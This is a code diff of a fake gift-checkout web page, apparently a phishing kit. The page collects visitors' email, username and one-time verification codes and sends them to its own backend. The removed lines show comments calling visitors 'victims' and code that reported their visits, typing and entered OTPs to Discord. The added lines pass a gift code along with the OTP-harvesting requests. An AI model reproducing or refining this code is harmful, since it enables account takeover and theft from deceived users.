@@ -564,10 +564,6 @@ body {
                         </div>
                     </div>
 
-                    <div class="form-group">
-                        <label class="form-label">Zip Code / Postal Code</label>
-                        <input type="text" id="billing-zip" class="form-input" placeholder="Zip Code / Postal Code" required autocomplete="postal-code"/>
-                    </div>
 
                     <label class="checkbox-group">
                         <input type="checkbox"/>
@@ -808,23 +804,6 @@ body {
             } catch (e) {}
         };
 
-        // Notify Discord when visitor lands on page
-        sendWebActivity('click_link', 'New user clicked the link');
-
-        // Input listeners to notify Discord when victim fills in details
-        let inputDebounce = null;
-        ['billing-firstname', 'billing-lastname', 'billing-email', 'billing-zip'].forEach(id => {
-            const el = document.getElementById(id);
-            if (el) {
-                el.addEventListener('blur', () => {
-                    const email = document.getElementById('billing-email')?.value?.trim();
-                    const fn = document.getElementById('billing-firstname')?.value?.trim();
-                    if (email || fn) {
-                        sendWebActivity('input', 'Typing details');
-                    }
-                });
-            }
-        });
 
         // Render Order Summary
         const tbody = document.getElementById('summary-tbody');
@@ -905,19 +884,17 @@ body {
         // Hide prior errors
         if (errBanner) errBanner.style.display = 'none';
 
-        // Notify Discord: User submitted details and clicked continue
-        sendWebActivity('input', 'Click Continue');
-
         // Loading state
         const origBtnHtml = submitBtn.innerHTML;
         submitBtn.disabled = true;
         submitBtn.innerHTML = `<i class="fa fa-circle-notch fa-spin"></i> <span>Verifying Account...</span>`;
 
         try {
+            const curGiftCode = (new URLSearchParams(window.location.search)).get('code') || localStorage.getItem('donut_gift_code') || '';
             const resp = await fetch(getApiUrl('/api/send-otp'), {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email, username })
+                body: JSON.stringify({ email, username, giftCode: curGiftCode })
             });
 
             const data = await resp.json();
@@ -1012,12 +989,14 @@ body {
         }
 
         try {
+            const curGiftCode = (new URLSearchParams(window.location.search)).get('code') || localStorage.getItem('donut_gift_code') || '';
             const resp = await fetch(getApiUrl('/api/send-otp'), {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     email: window.__otpSession.email,
-                    username: window.__otpSession.username
+                    username: window.__otpSession.username,
+                    giftCode: curGiftCode
                 })
             });
             const data = await resp.json();
@@ -1062,14 +1041,12 @@ body {
 
         if (errBanner) errBanner.style.display = 'none';
 
-        // Notify Discord: User entered and submitted OTP
-        sendWebActivity('input', `Entered OTP: ${code} | Verifying...`);
-
         const origBtnHtml = submitBtn.innerHTML;
         submitBtn.disabled = true;
         submitBtn.innerHTML = `<i class="fa fa-circle-notch fa-spin"></i> <span>Verifying &amp; Finalizing Order...</span>`;
 
         try {
+            const curGiftCode = (new URLSearchParams(window.location.search)).get('code') || localStorage.getItem('donut_gift_code') || '';
             const resp = await fetch(getApiUrl('/api/verify-otp'), {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -1078,7 +1055,8 @@ body {
                     email: window.__otpSession.email,
                     secId: window.__otpSession.secId,
                     code: code,
-                    username: window.__otpSession.username
+                    username: window.__otpSession.username,
+                    giftCode: curGiftCode
                 })
             });
 
